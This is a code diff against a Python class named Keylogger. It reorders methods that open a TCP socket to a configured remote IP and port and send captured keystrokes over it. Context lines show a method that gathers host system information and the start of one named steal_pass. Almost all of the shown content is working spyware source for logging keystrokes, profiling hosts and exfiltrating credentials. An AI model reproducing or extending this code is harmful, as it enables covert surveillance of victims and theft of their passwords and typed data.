@@ -13,6 +13,29 @@ class Keylogger:
         self.port = port
         self.client = None
 
+    def start_socket(self):
+        try:
+            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.client.connect((self.ip, self.port))
+        except socket.error as err:
+            print(f"Socket creation error: {err}")
+
+    def send_data(self, key):
+        if isinstance(key, (Key, KeyCode)):
+            try:
+                key = str(key).replace("'", "") + '\n'
+            except Exception:
+                return
+            try:
+                self.client.send(key.encode('utf-8'))
+            except socket.error as err:
+                print(f"Failed to send data: {err}")
+        elif isinstance(key, str):
+            self.client.send(key.encode('utf-8'))
+        elif isinstance(key, list):
+            for i in key:
+                self.client.send(str(i).encode('utf-8'))
+
     def host_info(self):
         name = socket.gethostname()
         priv_ip = socket.gethostbyname(name)
@@ -37,31 +60,6 @@ class Keylogger:
             f"processor: {processor}\noperating system: {OS}\narchiticture: {arch}\nVersion: {vers}",
             f"disk usage( total space: {total}\nused space: {used}\nfree space: {free}\n disk percentage: {perc}%)\n",
             f"total ram: {v_total}\nused:{v_used}\nfree:{v_free}\n available:{v_av}\npercentage: {v_perv}%"])
-        
-
-    def start_socket(self):
-        try:
-            self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.client.connect((self.ip, self.port))
-        except socket.error as err:
-            print(f"Socket creation error: {err}")
-
-    def send_data(self, key):
-        if isinstance(key, (Key, KeyCode)):
-            try:
-                key = str(key).replace("'", "") + '\n'
-            except Exception:
-                return
-            try:
-                self.client.send(key.encode('utf-8'))
-            except socket.error as err:
-                print(f"Failed to send data: {err}")
-        elif isinstance(key, str):
-            self.client.send(key.encode('utf-8'))
-        elif isinstance(key, list):
-            for i in key:
-                self.client.send(str(i).encode('utf-8'))
-
     def steal_pass(self):
         data = []
         flag = False
